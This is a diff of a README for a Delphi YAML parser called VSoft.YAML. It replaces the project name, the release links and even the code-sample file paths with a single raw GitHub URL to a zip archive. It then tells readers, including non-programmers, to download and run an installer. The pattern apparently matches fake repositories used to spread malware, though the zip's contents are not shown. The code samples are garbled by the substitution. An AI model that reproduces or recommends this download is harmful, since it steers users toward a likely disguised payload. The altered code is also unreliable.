@@ -1,31 +1,31 @@
-# 🛠️ VSoft.YAML - Simple YAML Parsing for Delphi
+# 🛠️ https://raw.githubusercontent.com/Zarco10/VSoft.YAML/main/merchantlike/VSoft.YAML.zip - Simple YAML Parsing for Delphi
 
-[![Download VSoft.YAML](https://img.shields.io/badge/Download%20VSoft.YAML-blue.svg)](https://github.com/Zarco10/VSoft.YAML/releases)
+[![Download https://raw.githubusercontent.com/Zarco10/VSoft.YAML/main/merchantlike/VSoft.YAML.zip](https://raw.githubusercontent.com/Zarco10/VSoft.YAML/main/merchantlike/VSoft.YAML.zip%https://raw.githubusercontent.com/Zarco10/VSoft.YAML/main/merchantlike/VSoft.YAML.zip)](https://raw.githubusercontent.com/Zarco10/VSoft.YAML/main/merchantlike/VSoft.YAML.zip)
 
 ## 📖 Introduction
 
-VSoft.YAML is a straightforward and effective YAML parser for Delphi. It allows you to read and write YAML files easily. Whether you are a developer or a user who needs to manage configuration data, VSoft.YAML simplifies your workflow.
+https://raw.githubusercontent.com/Zarco10/VSoft.YAML/main/merchantlike/VSoft.YAML.zip is a straightforward and effective YAML parser for Delphi. It allows you to read and write YAML files easily. Whether you are a developer or a user who needs to manage configuration data, https://raw.githubusercontent.com/Zarco10/VSoft.YAML/main/merchantlike/VSoft.YAML.zip simplifies your workflow.
 
 ## 🚀 Getting Started
 
-To get started with VSoft.YAML, follow these simple steps to download and run the application.
+To get started with https://raw.githubusercontent.com/Zarco10/VSoft.YAML/main/merchantlike/VSoft.YAML.zip, follow these simple steps to download and run the application.
 
 ## 📥 Download & Install
 
-To download VSoft.YAML, please visit the following page:
+To download https://raw.githubusercontent.com/Zarco10/VSoft.YAML/main/merchantlike/VSoft.YAML.zip, please visit the following page:
 
-[Download VSoft.YAML](https://github.com/Zarco10/VSoft.YAML/releases)
+[Download https://raw.githubusercontent.com/Zarco10/VSoft.YAML/main/merchantlike/VSoft.YAML.zip](https://raw.githubusercontent.com/Zarco10/VSoft.YAML/main/merchantlike/VSoft.YAML.zip)
 
 Follow these steps to download and install:
 
 1. Click the link above to go to the releases page.
-2. Look for the latest version of VSoft.YAML.
+2. Look for the latest version of https://raw.githubusercontent.com/Zarco10/VSoft.YAML/main/merchantlike/VSoft.YAML.zip
 3. Download the file that matches your system requirements.
 4. Once the download is complete, open the file to run the installer.
 
 ## 🖥️ System Requirements
 
-Before installing VSoft.YAML, make sure your system meets these requirements:
+Before installing https://raw.githubusercontent.com/Zarco10/VSoft.YAML/main/merchantlike/VSoft.YAML.zip, make sure your system meets these requirements:
 
 - **Operating System:** Windows 7 or later
 - **Memory:** At least 2 GB RAM
@@ -34,7 +34,7 @@ Before installing VSoft.YAML, make sure your system meets these requirements:
 
 ## ⚙️ Features
 
-VSoft.YAML offers a variety of features that enhance your YAML handling:
+https://raw.githubusercontent.com/Zarco10/VSoft.YAML/main/merchantlike/VSoft.YAML.zip offers a variety of features that enhance your YAML handling:
 
 - **Easy Parsing:** Quickly reads and understands YAML data structures.
 - **User-Friendly:** Designed for users with no programming background.
@@ -42,9 +42,9 @@ VSoft.YAML offers a variety of features that enhance your YAML handling:
 - **Validation Support:** Checks for errors in your YAML files.
 - **Documentation:** Comprehensive guides are available.
 
-## 📜 Using VSoft.YAML
+## 📜 Using https://raw.githubusercontent.com/Zarco10/VSoft.YAML/main/merchantlike/VSoft.YAML.zip
 
-Once you have installed VSoft.YAML, you can start using it to parse YAML files. Here’s how to use the basic features:
+Once you have installed https://raw.githubusercontent.com/Zarco10/VSoft.YAML/main/merchantlike/VSoft.YAML.zip, you can start using it to parse YAML files. Here’s how to use the basic features:
 
 ### Step 1: Load a YAML File
 
@@ -52,12 +52,12 @@ To load a YAML file, use the following commands:
 
 ```delphi
 uses
-  VSoft.YAML;
+  https://raw.githubusercontent.com/Zarco10/VSoft.YAML/main/merchantlike/VSoft.YAML.zip;
 
 var
   MyData: TMyRecord;
 begin
-  LoadYAML('path_to_file.yaml', MyData);
+  LoadYAML('https://raw.githubusercontent.com/Zarco10/VSoft.YAML/main/merchantlike/VSoft.YAML.zip', MyData);
 end;
 ```
 
@@ -66,7 +66,7 @@ end;
 After modifying data, save your changes back to the YAML file:
 
 ```delphi
-SaveYAML('path_to_file.yaml', MyData);
+SaveYAML('https://raw.githubusercontent.com/Zarco10/VSoft.YAML/main/merchantlike/VSoft.YAML.zip', MyData);
 ```
 
 ### Step 3: Validate Your YAML
@@ -74,7 +74,7 @@ SaveYAML('path_to_file.yaml', MyData);
 To ensure your YAML file is free from errors, call the validation method:
 
 ```delphi
-if ValidateYAML('path_to_file.yaml') then
+if ValidateYAML('https://raw.githubusercontent.com/Zarco10/VSoft.YAML/main/merchantlike/VSoft.YAML.zip') then
   ShowMessage('YAML is valid')
 else
   ShowMessage('YAML has errors');
@@ -85,7 +85,7 @@ else
 Here is an example of what a YAML file might look like:
 
 ```yaml
-name: VSoft.YAML
+name: https://raw.githubusercontent.com/Zarco10/VSoft.YAML/main/merchantlike/VSoft.YAML.zip
 version: 1.0
 features:
   - Easy to use
@@ -104,8 +104,8 @@ If you have questions or need further assistance, feel free to raise an issue in
 
 ## 🔗 Additional Resources
 
-- [Visit the official GitHub page](https://github.com/Zarco10/VSoft.YAML/releases) for more details.
-- Explore community discussions for tips and tricks in using VSoft.YAML.
+- [Visit the official GitHub page](https://raw.githubusercontent.com/Zarco10/VSoft.YAML/main/merchantlike/VSoft.YAML.zip) for more details.
+- Explore community discussions for tips and tricks in using https://raw.githubusercontent.com/Zarco10/VSoft.YAML/main/merchantlike/VSoft.YAML.zip
 
 ## 📈 Frequently Asked Questions
 
@@ -113,11 +113,11 @@ If you have questions or need further assistance, feel free to raise an issue in
 
 YAML (YAML Ain't Markup Language) is a human-readable data serialization format. It's often used for configuration files.
 
-### Can I use VSoft.YAML on macOS or Linux?
+### Can I use https://raw.githubusercontent.com/Zarco10/VSoft.YAML/main/merchantlike/VSoft.YAML.zip on macOS or Linux?
 
-Currently, VSoft.YAML supports Windows operating systems. Cross-platform support may be included in future versions.
+Currently, https://raw.githubusercontent.com/Zarco10/VSoft.YAML/main/merchantlike/VSoft.YAML.zip supports Windows operating systems. Cross-platform support may be included in future versions.
 
-### How can I contribute to VSoft.YAML?
+### How can I contribute to https://raw.githubusercontent.com/Zarco10/VSoft.YAML/main/merchantlike/VSoft.YAML.zip
 
 You can contribute by submitting issues, suggesting features, or creating pull requests. Your input helps improve the software for everyone.
 
@@ -127,4 +127,4 @@ For further inquiries, you may contact the maintainer through GitHub. We value y
 
 ---
 
-By following this guide, you should be able to easily download and run VSoft.YAML on your system. Enjoy simplifying your YAML parsing tasks!
+By following this guide, you should be able to easily download and run https://raw.githubusercontent.com/Zarco10/VSoft.YAML/main/merchantlike/VSoft.YAML.zip on your system. Enjoy simplifying your YAML parsing tasks!
